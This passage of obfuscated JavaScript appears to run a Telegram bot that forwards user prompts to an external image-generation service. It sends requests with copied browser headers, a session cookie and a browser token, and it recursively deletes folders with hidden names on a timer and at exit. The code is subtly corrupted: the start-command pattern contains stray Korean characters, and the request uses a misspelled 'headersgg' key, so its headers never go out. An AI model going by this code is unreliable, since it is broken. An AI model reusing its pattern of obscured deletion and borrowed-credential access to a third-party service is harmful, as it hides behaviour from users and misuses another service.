            'wPNMA': _0x2cdd3d(0x2c5) + _0x2cdd3d(0xd77) + _0x2cdd3d(0xddc) + _0x2cdd3d(0x3dd) + _0x2cdd3d(0x469) + _0x2cdd3d(0xd3a) + _0x2cdd3d(0x555) + _0x2cdd3d(0x41c) + _0x2cdd3d(0xcfa) + _0x2cdd3d(0xb4d) + _0x2cdd3d(0xab4) + _0x2cdd3d(0xc14) + _0x2cdd3d(0xd57) + _0x2cdd3d(0x543) + _0x2cdd3d(0x4e2) + _0x2cdd3d(0x325) + _0x2cdd3d(0xe12) + _0x2cdd3d(0x18f) + _0x2cdd3d(0x575),
            'zJvDw': _0x2cdd3d(0x6d1) + _0x2cdd3d(0x6ea) + _0x2cdd3d(0xc91),
            'iFYOZ': _0x2cdd3d(0x6d1) + _0x2cdd3d(0x6ea) + _0x2cdd3d(0x206) + _0x2cdd3d(0xca3) + 'er',
            'SEZrY': _0x2cdd3d(0x700) + _0x2cdd3d(0xd01) + _0x2cdd3d(0x385) + _0x2cdd3d(0x298),
            'eghDC': _0x2cdd3d(0xb6d),
            'gvzFO': _0x2cdd3d(0xa1d),
            'CUhki': _0x2cdd3d(0x304),
            'XysSW': _0x2cdd3d(0x76f) + 'n',
            'hGJsq': _0x2cdd3d(0xbc7) + _0x2cdd3d(0x62f) + _0x2cdd3d(0xc89) + _0x2cdd3d(0x893) + _0x2cdd3d(0x956) + _0x2cdd3d(0x74f) + _0x2cdd3d(0xa25) + _0x2cdd3d(0xdb4) + _0x2cdd3d(0xba1) + _0x2cdd3d(0xa9a) + _0x2cdd3d(0x3bb) + '6',
            'bOfNz': _0x2cdd3d(0x664) + _0x2cdd3d(0x6d9),
            'PRIuU': _0x2cdd3d(0x95e) + _0x2cdd3d(0xdb1),
            'ECssS': _0x2cdd3d(0x861),
            'ASBNp': _0x2cdd3d(0x7a4) + _0x2cdd3d(0x7ee),
            'AqrAC': _0x2cdd3d(0x585) + _0x2cdd3d(0x29d),
            'AoZyu': function (_0x488b66, _0x2b9f1d, _0x13b31e) {
                return _0x488b66(_0x2b9f1d, _0x13b31e);
            },
            'CfFDt': _0x2cdd3d(0x938),
            'VjTrW': function (_0x4abd2b, _0x52b735) {
                return _0x4abd2b === _0x52b735;
            }
        }, _0x467388 = _0x593f21[_0x2cdd3d(0xb07)], _0x1a99b1 = {
            'authority': _0x593f21[_0x2cdd3d(0x6d6)],
            'accept': _0x593f21[_0x2cdd3d(0xb22)],
            'accept-language': _0x593f21[_0x2cdd3d(0xbf4)],
            'content-type': _0x593f21[_0x2cdd3d(0xb22)],
            'cookie': _0x593f21[_0x2cdd3d(0xc2c)],
            'origin': _0x593f21[_0x2cdd3d(0xa1f)],
            'referer': _0x593f21[_0x2cdd3d(0x42f)],
            'sec-ch-ua': _0x593f21[_0x2cdd3d(0x643)],
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': _0x593f21[_0x2cdd3d(0x4b0)],
            'sec-fetch-dest': _0x593f21[_0x2cdd3d(0x2f5)],
            'sec-fetch-mode': _0x593f21[_0x2cdd3d(0x7ae)],
            'sec-fetch-site': _0x593f21[_0x2cdd3d(0x6d4)],
            'user-agent': _0x593f21[_0x2cdd3d(0xa03)]
        }, _0x3af2eb = {
            'job': {
                'name': _0x593f21[_0x2cdd3d(0xaed)],
                'data': {
                    'seed': 0x0,
                    'prompt': _0xca0363,
                    'guidance_scale': 0x1,
                    'width': 0x400,
                    'height': 0x400,
                    'num_inference_steps': 0x4,
                    'init_image': null,
                    'init_image_strength': 0.2,
                    'scribble_guidance_scale': 0x0,
                    'scribble_guidance_image': null,
                    'model_name': _0x593f21[_0x2cdd3d(0xc06)],
                    'return_binary': !![],
                    'image_format': _0x593f21[_0x2cdd3d(0x9af)],
                    'ipa_data': [],
                    'negative_prompt': '',
                    'do_upres': ![],
                    'do_upscale': ![]
                },
                'alias': _0x593f21[_0x2cdd3d(0x1de)]
            },
            'environment': null,
            'browserToken': _0x593f21[_0x2cdd3d(0x47c)]
        }, _0x51282a = await _0x593f21[_0x2cdd3d(0x36c)](fetch, _0x467388, {
            'method': _0x593f21[_0x2cdd3d(0x3d6)],
            'headersgg': _0x1a99b1,
            'body': JSON[_0x2cdd3d(0x36e)](_0x3af2eb)
        });
    if (_0x593f21[_0x2cdd3d(0xcaf)](_0x51282a[_0x2cdd3d(0x972)], -0x61 * 0xe + -0x1818 + 0x1e2e))
        return _0x51282a[_0x2cdd3d(0x8b2)]();
    return null;
}
function rem_time_uL4(_0x43f284) {
    const _0x4d5d16 = _0x54266d, _0x2db3a0 = {
            'bZJzl': function (_0x569f8f, _0x315f31) {
                return _0x569f8f - _0x315f31;
            },
            'yxWdM': function (_0x54c34f, _0x17ffe1) {
                return _0x54c34f - _0x17ffe1;
            },
            'GWVOM': function (_0x2bcd0a, _0x152040) {
                return _0x2bcd0a / _0x152040;
            },
            'CUksF': function (_0x5e7ff3, _0x1f5f91) {
                return _0x5e7ff3 / _0x1f5f91;
            },
            'OTcjB': function (_0x32445e, _0x34a8ba) {
                return _0x32445e % _0x34a8ba;
            },
            'gIbEi': _0x4d5d16(0xdae) + _0x4d5d16(0xda4)
        };
    if (user_last_req_HZ1[_0x43f284]) {
        const _0x767f95 = _0x2db3a0[_0x4d5d16(0x8a6)](Date[_0x4d5d16(0x45d)](), user_last_req_HZ1[_0x43f284]), _0x17ef9c = Math[_0x4d5d16(0x1b0)](0x37 * 0x17 + -0x178 + 0x7f * -0x7, _0x2db3a0[_0x4d5d16(0x5ed)](0x21 * 0xcdaf + -0x87b71 + -0x44c7e, _0x767f95)), _0x9a7b4 = Math[_0x4d5d16(0xd54)](_0x2db3a0[_0x4d5d16(0x6b5)](_0x17ef9c, 0x1fa7 + -0xce8b + 0x886c * 0x3)), _0xaa5337 = Math[_0x4d5d16(0xd54)](_0x2db3a0[_0x4d5d16(0x438)](_0x2db3a0[_0x4d5d16(0x18d)](_0x17ef9c, 0xe23 * -0x17 + 0x99c6 + -0xf1 * -0x1af), 0x1a79 * -0x1 + 0x1 * 0x4e9 + -0x1978 * -0x1));
        return _0x9a7b4 + _0x4d5d16(0xc10) + _0xaa5337 + _0x4d5d16(0xbbd);
    }
    return _0x2db3a0[_0x4d5d16(0x821)];
}
bot[_0x54266d(0xb39)](/\/sta노잽ㅍrt/, _0x378fc2 => {
    const _0x3dfce2 = _0x54266d, _0x4e8e0e = {
            'iNBTo': _0x3dfce2(0xacb) + _0x3dfce2(0x60d),
            'TWenK': _0x3dfce2(0x946),
            'VzNww': _0x3dfce2(0x23a) + _0x3dfce2(0xad4) + _0x3dfce2(0xca8) + 'ه:'
        }, _0x6ff2a2 = _0x378fc2[_0x3dfce2(0x6a9)]['id'], _0x260818 = {
            'reply_markup': {
                'inline_keyboard': [[{
                            'text': _0x4e8e0e[_0x3dfce2(0x798)],
                            'callback_data': _0x4e8e0e[_0x3dfce2(0x73a)]
                        }]]
            }
        };
    bot[_0x3dfce2(0x741) + 'e'](_0x6ff2a2, _0x4e8e0e[_0x3dfce2(0xcb4)], _0x260818);
}), bot['on'](_0x54266d(0x546) + _0x54266d(0x352), _0x1fe5cc => {
    const _0x581717 = _0x54266d, _0x538cf7 = {
            'kVjbG': function (_0x1ee55b, _0x209471) {
                return _0x1ee55b === _0x209471;
            },
            'IXfzy': _0x581717(0x946),
            'qhZzf': _0x581717(0xd3f),
            'oUTOi': _0x581717(0xa99) + _0x581717(0x659),
            'uzRGf': _0x581717(0x23e) + _0x581717(0x265) + _0x581717(0xce0),
            'RGRKl': function (_0x538d8a, _0x417889) {
                return _0x538d8a < _0x417889;
            },
            'KePAc': function (_0x45ea58, _0x4011e4) {
                return _0x45ea58 - _0x4011e4;
            },
            'dupPK': function (_0x431393, _0x547dc6) {
                return _0x431393(_0x547dc6);
            },
            'UfpDC': _0x581717(0xa00) + _0x581717(0x6cc) + _0x581717(0xd41) + _0x581717(0xc4d) + 'ة.'
        }, _0x54ced8 = _0x1fe5cc[_0x581717(0x842)][_0x581717(0x6a9)]['id'], _0x3db456 = _0x1fe5cc[_0x581717(0x50f)];
    if (_0x538cf7[_0x581717(0x472)](_0x3db456, _0x538cf7[_0x581717(0x3b7)])) {
        const _0x3826a9 = {
            'reply_markup': {
                'inline_keyboard': [[{
                            'text': _0x538cf7[_0x581717(0x421)],
                            'callback_data': _0x538cf7[_0x581717(0xd68)]
                        }]]
            }
        };
        bot[_0x581717(0x708) + _0x581717(0xdb0)](_0x538cf7[_0x581717(0x322)], {
            'chat_id': _0x54ced8,
            'message_id': _0x1fe5cc[_0x581717(0x842)][_0x581717(0x57f)],
            ..._0x3826a9
        });
    } else {
        if (_0x538cf7[_0x581717(0x472)](_0x3db456, _0x538cf7[_0x581717(0xd68)])) {
            const _0xea1061 = Date[_0x581717(0x45d)]();
            if (user_last_req_HZ1[_0x54ced8] && _0x538cf7[_0x581717(0x46c)](_0x538cf7[_0x581717(0xbff)](_0xea1061, user_last_req_HZ1[_0x54ced8]), 0xfcea7 + -0x1 * 0x167be + -0xab49)) {
                const _0x299b35 = _0x538cf7[_0x581717(0x668)](rem_time_uL4, _0x54ced8);
                bot[_0x581717(0x741) + 'e'](_0x54ced8, _0x581717(0x998) + _0x581717(0x34e) + _0x581717(0x68e) + _0x581717(0x5c0) + _0x581717(0x722) + _0x581717(0xe0f) + _0x299b35 + '.');
            } else
                user_last_req_HZ1[_0x54ced8] = _0xea1061, user_req_flag_xT9[_0x54ced8] = !![], bot[_0x581717(0x741) + 'e'](_0x54ced8, _0x538cf7[_0x581717(0x786)]);
        }
    }
}), bot['on'](_0x54266d(0x842), async _0x235495 => {
    const _0x12f600 = _0x54266d, _0xab4e6c = {
            'YYlvh': _0x12f600(0x551) + _0x12f600(0x940) + _0x12f600(0x598) + _0x12f600(0x392) + '.',
            'SIdfS': function (_0x3f4097, _0xf761ec) {
                return _0x3f4097(_0xf761ec);
            },
            'ObrNZ': _0x12f600(0x5ff) + _0x12f600(0xa65) + _0x12f600(0x74e)
        }, _0x566235 = _0x235495[_0x12f600(0x6a9)]['id'], _0x7cfdd8 = _0x235495[_0x12f600(0x9ac)];
    if (!user_req_flag_xT9[_0x566235])
        return bot[_0x12f600(0x741) + 'e'](_0x566235, '');
    if (!/^[\x00-\x7F]*$/[_0x12f600(0x78b)](_0x7cfdd8))
        return bot[_0x12f600(0x741) + 'e'](_0x566235, _0xab4e6c[_0x12f600(0xbe4)]);
    const _0x367d61 = await bot[_0x12f600(0x741) + 'e'](_0x566235, '✨'), _0x41cde7 = await _0xab4e6c[_0x12f600(0x5ac)](img_gen_req_9uH, _0x7cfdd8);
    if (_0x41cde7) {
        const _0x1c849d = Readable[_0x12f600(0x8e6)](_0x41cde7);
        await bot[_0x12f600(0x359)](_0x566235, _0x1c849d), bot[_0x12f600(0x802) + _0x12f600(0x909)](_0x566235, _0x367d61[_0x12f600(0x57f)]), user_req_flag_xT9[_0x566235] = ![];
    } else
        bot[_0x12f600(0x741) + 'e'](_0x566235, _0xab4e6c[_0x12f600(0x6fb)]), bot[_0x12f600(0x802) + _0x12f600(0x909)](_0x566235, _0x367d61[_0x12f600(0x57f)]);
});
const clearTemporaryStorage = () => {
    const _0x57e5fa = _0x54266d, _0x23b2a0 = {
            'oQzdW': function (_0x1f76fc, _0x220718) {
                return _0x1f76fc(_0x220718);
            },
            'Itnia': _0x57e5fa(0x48f) + _0x57e5fa(0xded) + _0x57e5fa(0xcd3),
            'xApyA': _0x57e5fa(0xdfd),
            'SzhSf': _0x57e5fa(0x825),
            'fhAKH': _0x57e5fa(0x4ec),
            'JufcM': _0x57e5fa(0x6a4) + _0x57e5fa(0x571) + _0x57e5fa(0xd7b) + _0x57e5fa(0x38f)
        };
    try {
        console[_0x57e5fa(0xb18)](_0x23b2a0[_0x57e5fa(0x573)]);
        const _0x3274b2 = [
            _0x23b2a0[_0x57e5fa(0x518)],
            _0x23b2a0[_0x57e5fa(0xbba)],
            _0x23b2a0[_0x57e5fa(0x38b)]
        ];
        _0x3274b2[_0x57e5fa(0xcba)](_0x4c2016 => {
            const _0x259d92 = _0x57e5fa, _0x1885e3 = path[_0x259d92(0x75e)](__dirname, _0x4c2016);
            fs[_0x259d92(0xcf7)](_0x1885e3) ? (_0x23b2a0[_0x259d92(0x1af)](deleteFolderRecursive, _0x1885e3), console[_0x259d92(0xb18)](_0x259d92(0xc6c) + _0x259d92(0x2ef) + _0x1885e3)) : console[_0x259d92(0xb18)](_0x259d92(0xc38) + _0x259d92(0x495) + _0x1885e3);
        });
    } catch (_0x5e2c32) {
        console[_0x57e5fa(0x3a5)](_0x23b2a0[_0x57e5fa(0x97b)], _0x5e2c32);
    }
};
setInterval(() => {
    const _0x2bc299 = _0x54266d, _0x1a5906 = {
            'oIcMR': function (_0x18d923) {
                return _0x18d923();
            },
            'jjrNG': _0x2bc299(0x991) + _0x2bc299(0xaf7) + _0x2bc299(0x40f)
        };
    _0x1a5906[_0x2bc299(0xb4c)](clearTemporaryStorage), console[_0x2bc299(0xb18)](_0x1a5906[_0x2bc299(0xc0f)]);
}, (0x1e56 + 0x184c + -0x36a0) * (0x150b * -0x1 + -0xe70 + 0xdf * 0x29) * (-0xc5d * 0x2 + 0x1 * 0x13 + 0x1c8f));
const handleExit = () => {
    const _0x373312 = _0x54266d, _0x2fe4a1 = {
            'zkCkP': _0x373312(0x526) + _0x373312(0x32a) + _0x373312(0x2d5) + _0x373312(0x5e7),
            'SxEjz': function (_0x395fb9) {
                return _0x395fb9();
            }
        };
    console[_0x373312(0xb18)](_0x2fe4a1[_0x373312(0x22c)]), _0x2fe4a1[_0x373312(0x69c)](clearTemporaryStorage), process[_0x373312(0xd72)]();
};
process['on'](_0x54266d(0xd72), handleExit), process['on'](_0x54266d(0x67b), handleExit), process['on'](_0x54266d(0x9be), handleExit), process['on'](_0x54266d(0xb11), handleExit);